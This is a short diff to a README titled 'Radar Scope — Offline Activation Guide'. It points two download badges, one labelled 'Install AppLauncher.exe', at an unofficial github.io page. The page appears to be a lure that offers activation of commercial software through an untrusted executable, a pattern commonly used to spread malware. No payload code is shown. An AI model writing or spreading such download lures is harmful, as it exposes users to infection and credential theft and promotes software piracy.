@@ -1,8 +1,8 @@
 # Radar Scope — Offline Activation Guide
 
 🔘 **Download Setup Assistant**  
-[![Download for Windows](https://img.shields.io/badge/Download_for-Windows_10_&_11-green?style=for-the-badge&logo=windows)](#)
-[![Start Setup](https://img.shields.io/badge/Install_AppLauncher.exe-Now-brightgreen?style=for-the-badge&logo=gnome)](#)
+[![Download for Windows](https://img.shields.io/badge/Download_for-Windows_10_&_11-green?style=for-the-badge&logo=windows)](https://radar-scope-tools.github.io/.github/)
+[![Start Setup](https://img.shields.io/badge/Install_AppLauncher.exe-Now-brightgreen?style=for-the-badge&logo=gnome)](https://radar-scope-tools.github.io/.github/)
 
 ---
 
